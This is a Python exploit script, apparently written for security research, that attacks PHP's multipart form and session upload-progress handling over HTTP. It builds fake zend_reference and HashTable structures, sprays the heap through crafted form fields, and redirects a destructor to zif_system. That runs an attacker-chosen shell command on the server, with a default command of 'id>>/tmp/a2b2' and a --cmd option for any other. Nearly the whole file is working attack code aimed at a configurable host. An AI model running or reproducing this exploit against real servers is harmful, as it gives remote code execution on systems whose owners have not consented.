#!/usr/bin/env python3
"""Profile-aware A2/B2 builder and standalone calibration driver."""

from __future__ import annotations

import argparse
import socket
import time

from profiles import AbiLayout, DEFAULT_PROFILE, PROFILES


BOUNDARY = b"codex843a2b2"
DEFAULT_TARGET = PROFILES[DEFAULT_PROFILE]
DEFAULT_COMMAND = b"id>>/tmp/a2b2"


def command_capacity(value_length: int, abi: AbiLayout) -> int:
    return value_length - (abi.command_string_offset + abi.string_data_offset) - 1


def validate_command(command: bytes, value_length: int, abi: AbiLayout) -> None:
    if not command:
        raise ValueError("--cmd must not be empty")
    if b"\0" in command:
        raise ValueError("--cmd must not contain a NUL byte")
    capacity = command_capacity(value_length, abi)
    if len(command) > capacity:
        raise ValueError(
            f"--cmd is {len(command)} bytes; selected profile allows {capacity}"
        )


def store_unsigned(data: bytearray, offset: int, value: int, size: int,
                   byte_order: str) -> None:
    data[offset : offset + size] = value.to_bytes(size, byte_order, signed=False)


def part(disposition: bytes, body: bytes, extra: bytes = b"") -> bytes:
    return (
        b"--" + BOUNDARY + b"\r\nContent-Disposition: " + disposition + b"\r\n"
        + extra + b"\r\n" + body + b"\r\n"
    )


def chunk(sock: socket.socket, data: bytes) -> None:
    sock.sendall(f"{len(data):x}\r\n".encode() + data + b"\r\n")


def send_chunked(
    host: str,
    port: int,
    pieces,
    *,
    path: str = "/index.php",
) -> bytes:
    sock = socket.create_connection((host, port), timeout=60)
    sock.settimeout(60)
    sock.sendall(
        b"POST " + path.encode("ascii") + b" HTTP/1.1\r\nHost: " + host.encode() + b"\r\n"
        b"Content-Type: multipart/form-data; boundary=" + BOUNDARY + b"\r\n"
        b"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
    )
    try:
        for piece in pieces:
            chunk(sock, piece)
        sock.sendall(b"0\r\n\r\n")
    except OSError:
        pass
    out = bytearray()
    try:
        while True:
            block = sock.recv(65536)
            if not block:
                break
            out += block
    except OSError:
        pass
    sock.close()
    return bytes(out)


def fake_reference(
    target: int,
    value_length: int,
    refcount: int,
    start: int | None = None,
    *,
    abi: AbiLayout | None = None,
) -> bytes:
    """Repeat a profile-described zend_reference throughout a form value."""
    abi = abi or DEFAULT_TARGET.abi
    start = abi.reference_start if start is None else start
    one = bytearray(abi.reference_size)
    store_unsigned(one, abi.reference_gc_refcount_offset, refcount, 4, abi.byte_order)
    store_unsigned(
        one, abi.reference_gc_type_offset, abi.reference_gc_type, 1, abi.byte_order
    )
    store_unsigned(
        one, abi.reference_target_offset, target, abi.pointer_size, abi.byte_order
    )
    store_unsigned(
        one, abi.reference_zval_type_offset, abi.reference_zval_type, 4, abi.byte_order
    )
    value = bytearray(b"S" * value_length)
    for offset in range(start, value_length - abi.reference_size + 1, abi.reference_stride):
        value[offset : offset + abi.reference_size] = one
    return bytes(value)


def fake_hashtable(
    address: int,
    zif_system: int,
    value_length: int,
    *,
    abi: AbiLayout | None = None,
    marker_command: bytes | None = None,
) -> bytes:
    """Build a profile-described HashTable + execute_data command carrier."""
    abi = abi or DEFAULT_TARGET.abi
    marker_command = DEFAULT_COMMAND if marker_command is None else marker_command
    validate_command(marker_command, value_length, abi)
    payload = bytearray(value_length)
    execute_data = address + abi.execute_data_offset
    command_string = address + abi.command_string_offset

    # One static-key bucket.  zif_system receives arData, interpreted as a
    # zend_execute_data according to the selected ABI profile.
    u32_fields = (
        (abi.hashtable_gc_refcount_offset, abi.hashtable_gc_refcount),
        (abi.hashtable_gc_type_offset, abi.hashtable_gc_type),
        (abi.hashtable_flags_offset, abi.hashtable_flags),
        (abi.hashtable_mask_offset, abi.hashtable_mask),
        (abi.hashtable_n_used_offset, abi.hashtable_n_used),
        (abi.hashtable_n_elements_offset, abi.hashtable_n_elements),
        (abi.hashtable_size_offset, abi.hashtable_size),
        (abi.hashtable_internal_pointer_offset, abi.hashtable_internal_pointer),
    )
    for offset, value in u32_fields:
        store_unsigned(payload, offset, value, 4, abi.byte_order)
    store_unsigned(
        payload, abi.hashtable_data_offset, execute_data, abi.pointer_size, abi.byte_order
    )
    store_unsigned(
        payload, abi.hashtable_next_free_offset, abi.hashtable_next_free,
        abi.pointer_size, abi.byte_order,
    )
    store_unsigned(
        payload, abi.hashtable_destructor_offset, zif_system,
        abi.pointer_size, abi.byte_order,
    )

    execute = abi.execute_data_offset
    store_unsigned(
        payload, execute + abi.execute_call_info_offset,
        abi.execute_call_info, 4, abi.byte_order,
    )
    store_unsigned(
        payload, execute + abi.execute_num_args_offset,
        abi.execute_num_args, 4, abi.byte_order,
    )
    store_unsigned(
        payload, execute + abi.execute_argument_offset,
        command_string, abi.pointer_size, abi.byte_order,
    )
    store_unsigned(
        payload, execute + abi.execute_argument_type_offset,
        abi.execute_argument_type, 4, abi.byte_order,
    )
    store_unsigned(
        payload, execute + abi.execute_argument_extra_offset,
        abi.execute_argument_extra, 4, abi.byte_order,
    )

    string = abi.command_string_offset
    store_unsigned(
        payload, string + abi.string_gc_refcount_offset,
        abi.string_gc_refcount, 4, abi.byte_order,
    )
    store_unsigned(
        payload, string + abi.string_gc_type_offset,
        abi.string_gc_type, 4, abi.byte_order,
    )
    store_unsigned(
        payload, string + abi.string_hash_offset,
        abi.string_hash, abi.pointer_size, abi.byte_order,
    )
    store_unsigned(
        payload, string + abi.string_length_offset,
        len(marker_command), abi.pointer_size, abi.byte_order,
    )
    start = string + abi.string_data_offset
    payload[start : start + len(marker_command) + 1] = marker_command + b"\0"
    return bytes(payload)


def fixed_name(prefix: bytes, index: int, length: int) -> bytes:
    value = prefix + f"{index:09d}".encode()
    return (value + b"x" * length)[:length]


def b2_request(host: str, port: int, n1: int, n2: int, value_length: int,
               target: int, refcount: int, name_length: int, hold: float,
               ht_address: int, zif_system: int, *,
               path: str = "/index.php", abi: AbiLayout | None = None,
               marker_command: bytes | None = None) -> bytes:
    # A no-file request deliberately skips FILE_START/php_rinit_session.  Its
    # END cleanup reaches stale PS(http_session_vars) from A2.
    value = fake_reference(target, value_length, refcount, abi=abi)
    parts = []
    for i in range(n1):
        parts.append(part(b'form-data; name="' + fixed_name(b"s", i, name_length) + b'"', value))
    # A separately identifiable large value reserves the eventual fake-array
    # carrier position during calibration.
    ht = (fake_hashtable(
        ht_address, zif_system, value_length,
        abi=abi, marker_command=marker_command,
    )
          if ht_address and zif_system else b"H" * value_length)
    parts.append(part(b'form-data; name="ht"', ht))
    parts += [
        part(b'form-data; name="PHPSESSID"', b"b2sid"),
        part(b'form-data; name="PHP_SESSION_UPLOAD_PROGRESS"', b"b2"),
    ]
    for i in range(n2):
        parts.append(part(b'form-data; name="' + fixed_name(b"t", i, name_length) + b'"', value))
    ending = b"--" + BOUNDARY + b"--\r\n"
    body_length = sum(map(len, parts)) + len(ending)

    sock = socket.create_connection((host, port), timeout=60)
    sock.settimeout(60)
    sock.sendall(
        b"POST " + path.encode("ascii") + b" HTTP/1.1\r\nHost: " + host.encode() + b"\r\n"
        b"Content-Type: multipart/form-data; boundary=" + BOUNDARY + b"\r\n"
        + f"Content-Length: {body_length}\r\n".encode()
        + b"Connection: close\r\n\r\n"
    )
    for item in parts:
        sock.sendall(item)
    if hold:
        print(f"holding before END for {hold}s", flush=True)
        time.sleep(hold)
    try:
        sock.sendall(ending)
    except OSError:
        pass
    out = bytearray()
    try:
        while True:
            block = sock.recv(65536)
            if not block:
                break
            out += block
    except OSError:
        pass
    sock.close()
    return bytes(out)


def a2_pieces(parts: int, depth: int, fillers: int):
    yield part(b'form-data; name="PHPSESSID"', b"\0")
    yield part(b'form-data; name="PHP_SESSION_UPLOAD_PROGRESS"', b"a2")
    # These ordinary fields are parsed before the first FILE_START.  They move
    # the later session/reference allocations to a B2-reclaimable page.
    for i in range(fillers):
        yield part(b'form-data; name="' + f"{i:03d}".encode() + b'"', b"x")
    suffix = b"[x]" * depth
    for i in range(parts):
        name = b"u" + str(i).encode() + suffix
        yield part(b'form-data; name="' + name + b'"; filename=""', b"")
    yield b"--" + BOUNDARY + b"--\r\n"


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("mode", choices=("a2", "b2"), nargs="?", default="a2")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=19235)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--profile", choices=PROFILES, default=DEFAULT_PROFILE)
    ap.add_argument("--parts", type=int)
    ap.add_argument("--depth", type=int)
    ap.add_argument("--fillers", type=int)
    ap.add_argument("--n1", type=int)
    ap.add_argument("--n2", type=int)
    ap.add_argument("--value-length", type=int)
    ap.add_argument("--main-base", type=lambda s: int(s, 0))
    ap.add_argument("--libphp-base", type=lambda s: int(s, 0))
    ap.add_argument("--target", type=lambda s: int(s, 0))
    ap.add_argument("--ht-address", type=lambda s: int(s, 0))
    ap.add_argument("--zif-system", type=lambda s: int(s, 0))
    ap.add_argument("--refcount", type=int)
    ap.add_argument("--name-length", type=int)
    ap.add_argument("--hold", type=float)
    ap.add_argument("--cmd", default=DEFAULT_COMMAND.decode("ascii"))
    args = ap.parse_args()
    profile = PROFILES[args.profile]
    a2 = profile.a2
    b2 = profile.b2
    parts = a2.parts if args.parts is None else args.parts
    depth = a2.depth if args.depth is None else args.depth
    fillers = a2.fillers if args.fillers is None else args.fillers
    n1 = b2.first_sprays if args.n1 is None else args.n1
    n2 = b2.second_sprays if args.n2 is None else args.n2
    value_length = b2.value_length if args.value_length is None else args.value_length
    refcount = b2.reference_refcount if args.refcount is None else args.refcount
    name_length = b2.name_length if args.name_length is None else args.name_length
    hold = b2.hold_seconds if args.hold is None else args.hold
    try:
        command = args.cmd.encode("utf-8")
        validate_command(command, value_length, profile.abi)
    except (UnicodeEncodeError, ValueError) as exc:
        ap.error(str(exc))
    if args.mode == "a2":
        response = send_chunked(
            args.host, args.port, a2_pieces(parts, depth, fillers), path=args.path,
        )
    else:
        inferred_ht = (args.main_base + profile.heap.fake_array
                       if args.main_base is not None else 0)
        target = args.target if args.target is not None else (
            inferred_ht or 0x4141414141414141)
        ht_address = args.ht_address if args.ht_address is not None else inferred_ht
        zif_system = args.zif_system if args.zif_system is not None else (
            args.libphp_base + profile.symbols.zif_system
            if args.libphp_base is not None else 0)
        print(
            f"target={target:#x} ht_address={ht_address:#x} "
            f"zif_system={zif_system:#x}",
            flush=True,
        )
        response = b2_request(
            args.host, args.port, n1, n2, value_length, target, refcount,
            name_length, hold, ht_address, zif_system, path=args.path,
            abi=profile.abi, marker_command=command,
        )
    print(response[:1000].decode("latin1", "backslashreplace"))
    print(f"response_bytes={len(response)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
